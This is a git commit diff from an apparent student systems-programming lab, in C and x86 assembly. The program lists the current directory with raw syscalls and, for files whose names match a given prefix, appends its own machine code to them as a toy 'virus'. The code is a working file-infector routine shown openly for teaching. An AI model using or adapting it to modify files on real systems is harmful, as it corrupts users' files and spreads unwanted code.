04e52d56bdf1de0f5f8ae9472dd50cb4d5ab3cd9
tohanov <nope>
2022-11-28 07:32:10 +0200

    lab5: finished task2

--- lab5/task2/main.c
+++ lab5/task2/main.c
@@ -1,77 +1,109 @@
-/* // #include <fcntl.h>
-// #include <dirent.h>
-// #include <sys/types.h>
-// #include <dirent.h>
-// #include <sys/stat.h>
- */
-
-#define O_DIRECTORY	00200000
-#define O_RDONLY	     00
-/* 
-// https://syscalls32.paolostivanin.com/
-//  */
-
 #include "util.h"
-#include <dirent.h>
-#include <fcntl.h>
+
+#define SYS_EXIT 1
 #define SYS_WRITE 4
-#define STDOUT 1
 #define SYS_OPEN 5
 #define SYS_CLOSE 6
-#define SYS_getdents 141
+#define SYS_GETDENTS 141
+
+#define O_DIRECTORY	0200000
+#define O_RDONLY 00
+#define O_RDWR 02
+
+#define STDOUT 1
 #define NULL 0
-/* // #define O_RDWR 2
-// #define SYS_SEEK 19
-// #define SEEK_SET 0
-// #define SHIRA_OFFSET 0x291
-// #define BUF_SIZE 1024 */
+#define BUF_SIZE 8192
+#define ERR_EXIT_CODE 0x55
 
-typedef struct ent
-{
-  int inode;
-  int offset;
 
-  short structSize;
-  char fileName[256];
-} ent;
+typedef struct dirent {
+	int inode;
+	int offset;
+
+	short structSize;
+	char fileName[256];
+} dirent;
+
 
 extern int system_call();
+extern void infection(int);
+extern int infector(char*);
+/* extern int infector(char*); */
 
-int main (int argc , char* argv[], char* envp[])
-{   
-	#define BUF_SIZE 2000
+/* typedef struct dirent dirent; */
+
+
+int main (int argc , char* argv[], char* envp[]) {
 	int folderDescriptor = 0;
+
+	int i = 0;
+
+	char prefixFlag = 0;
+	char *prefix = NULL;
+	int prefixLen = 0;
+	
+	dirent *fileInfo = NULL;
 	long bytesRead = 0;
 	char bytesArray[BUF_SIZE];
-	ent *fileInfo = (ent*)bytesArray;
-	char *bytesIterator = bytesArray;
-	/* // struct linux_dirent *d;
-	// char d_type; */
+	char *bytesIterator = NULL;
+
+	char *virusAttached = " -- VIRUS ATTACHED";
+	int virusAttachedLen = strlen(virusAttached);
+
+	for (i = 0; i < argc; ++i) {
+		if (strncmp(argv[i], "-a", 2) == 0) {
+			prefixFlag = 1;
+			prefix = argv[i] + 2;
+			prefixLen = strlen(prefix);
+			
+			system_call(SYS_WRITE, STDOUT, "prefix: ", 8);
+			system_call(SYS_WRITE, STDOUT, prefix, prefixLen );
+			system_call(SYS_WRITE,STDOUT,"\n",1);
+			
+			break;
+		}
+	}
 
 	folderDescriptor = system_call(SYS_OPEN, ".", O_RDONLY/* | O_DIRECTORY */, 0);
 	if(folderDescriptor < 0) {
 		system_call(SYS_WRITE, STDOUT, "error\n", 6);
+		system_call(SYS_EXIT, ERR_EXIT_CODE, 0, 0);
 	}
 
-	bytesRead = system_call(SYS_getdents , folderDescriptor, bytesArray, BUF_SIZE);
+	bytesRead = system_call(SYS_GETDENTS , folderDescriptor, bytesArray, BUF_SIZE);
 
-	/* system_call(SYS_WRITE, STDOUT, itoa(bytesRead), 12 );
-	system_call(SYS_WRITE, STDOUT, " bytes were read", 16 );
+	system_call(SYS_CLOSE, folderDescriptor); /* close the folder's descriptor */
+
+	/* system_call(SYS_WRITE, STDOUT, itoa(bytesRead), 12);
+	system_call(SYS_WRITE, STDOUT, " bytes were read", 16);
 	system_call(SYS_WRITE,STDOUT,"\n",1); */
-
+	
+	system_call(SYS_WRITE, STDOUT, "\n", 1);
 	char *bytesArrayEnd = bytesArray + bytesRead;
+
 	for (bytesIterator = bytesArray; bytesIterator < bytesArrayEnd; bytesIterator += fileInfo->structSize) {
-		fileInfo = (ent*)bytesIterator;
+		fileInfo = (dirent*)bytesIterator;
 
 		if (strncmp(fileInfo->fileName, ".", 2) == 0 ||
 			strncmp(fileInfo->fileName, "..", 3) == 0) {
 			continue;
 		}
-		
-		system_call(SYS_WRITE, STDOUT, fileInfo->fileName, strlen(fileInfo->fileName) );
-		system_call(SYS_WRITE,STDOUT, "\n", 1);
+
+		system_call(SYS_WRITE, STDOUT, fileInfo->fileName, strlen(fileInfo->fileName));
+
+		if (prefixFlag && strncmp(fileInfo->fileName, prefix, prefixLen) == 0) {
+			system_call(SYS_WRITE, STDOUT, virusAttached, virusAttachedLen);
+
+			/* int a =  */
+				infector(fileInfo->fileName);
+
+			/* system_call(SYS_WRITE, STDOUT, "descriptor was: ", 20);
+			system_call(SYS_WRITE, STDOUT, itoa(a), 12);
+			system_call(SYS_WRITE,STDOUT,"\n",1); */
+		}
+
+		system_call(SYS_WRITE, STDOUT, "\n", 1);
 	}
 
-	system_call(SYS_CLOSE, folderDescriptor);
 	return 0;
 }
--- lab5/task2/start.s
+++ lab5/task2/start.s
@@ -1,31 +1,44 @@
-section .text
+code_start:
+
+; section .text
+
 global _start
 global infector
+global infection
 global system_call
+
 extern main
-msg: db  'Hello,infected File',0xa ;our dear string
-    len equ $ - msg         ;length of our dear string
+
+SYS_WRITE equ 4
+SYS_OPEN equ 5
+SYS_CLOSE equ 6
+
+O_APPEND equ 1024
+O_RDWR equ 2
+
+STDOUT equ 1
 
 
 _start:
-    pop    dword ecx    ; ecx = argc
-    mov    esi,esp      ; esi = argv
-    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
-    mov     eax,ecx     ; put the number of arguments into eax
-    shl     eax,2       ; compute the size of argv in bytes
-    add     eax,esi     ; add the size to the address of argv 
-    add     eax,4       ; skip NULL at the end of argv
-    push    dword eax   ; char *envp[]
-    push    dword esi   ; char* argv[]
-    push    dword ecx   ; int argc
+	pop dword ecx    ; ecx = argc
+	mov esi, esp      ; esi = argv
+	;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
+	mov eax, ecx     ; put the number of arguments into eax
+	shl eax, 2       ; compute the size of argv in bytes
+	add eax, esi     ; add the size to the address of argv 
+	add eax, 4       ; skip NULL at the end of argv
+	push dword eax   ; char *envp[]
+	push dword esi   ; char* argv[]
+	push dword ecx   ; int argc
 
-    call    main        ; int main( int argc, char *argv[], char *envp[] )
+	call    main        ; int main( int argc, char *argv[], char *envp[] )
 
-    mov     ebx,eax
-    mov     eax,1
-    int     0x80
-    nop
-        
+	mov ebx, eax
+	mov eax, 1
+	int 0x80
+	nop
+
+
 system_call:
     push    ebp             ; Save caller state
     mov     ebp, esp
@@ -42,23 +55,107 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
-code_start:
-    infection:;how it get int and why?? //int
-        push ebp       
-        mov ebp,esp
-        pushad
-        mov edx,len ;length
-        mov ecx,msg ;message 
-        mov ebx,1   ;file descriptor 
-        mov eax,4   ;write
-        int 0x80    ;call 
-        popad
-        pop ebp
-        ret
-    infector:;get char
-        push ebp       
-        mov ebp,esp
-        pushad
-        sub esp,4
-       
-        
+
+
+	msg: db "Hello, Infected File", 0x0a
+	len equ $ - msg ; length of string
+
+
+	; infection(int)
+	infection:
+		push len
+		push msg
+		push STDOUT
+		push SYS_WRITE
+		call system_call_and_clean
+
+		ret
+
+
+	; infector(char*)
+	infector:
+		push ebp
+		mov ebp,esp
+
+		sub esp, 4 ; int descriptor
+		; ; pushad
+
+		push dword [ebp+8] ; arg1 = pointer to file path string
+		call open_append_file
+		add esp, 4
+
+		mov dword [ebp-4], eax ; descriptor = eax
+
+		push dword eax ; arg1 = descriptor
+		call infect_file
+		add esp, 4
+
+		push dword [ebp-4] ; arg1 = descriptor
+		call close_file
+		add esp, 4
+
+		; ; popad
+		add esp, 4 ; remove descriptor from stack
+		mov eax, [ebp-4]
+
+		pop ebp
+		ret
+
+
+; int open_file(char*)
+open_append_file:
+	push ebp
+	mov ebp, esp
+
+	push dword 0
+	push dword O_RDWR | O_APPEND
+	push dword [ebp+8] ; pointer to file name (this function's argument)
+	push SYS_OPEN
+	call system_call_and_clean
+
+	pop ebp
+	ret
+
+
+; int close_file(descriptor)
+close_file:
+	push ebp
+	mov ebp, esp
+
+	push dword 0
+	push dword 0
+	push dword [ebp+8] ; param1 = descriptor
+	push SYS_CLOSE
+	call system_call_and_clean
+
+	pop ebp
+	ret
+
+
+; void infect_file(int fileDescriptor)
+infect_file:
+	push ebp
+	mov ebp, esp
+
+	push dword code_end - code_start
+	push dword code_start
+	push dword [ebp+8] ; param1 = fileDescriptor
+	push SYS_WRITE
+	call system_call_and_clean
+	
+	pop ebp
+	ret
+
+
+; makes a sys_call and cleans arguments from stack
+system_call_and_clean:
+	pop edi
+
+	call system_call
+	add esp, 4*4
+	
+	push edi
+	ret
+
+
+code_end:
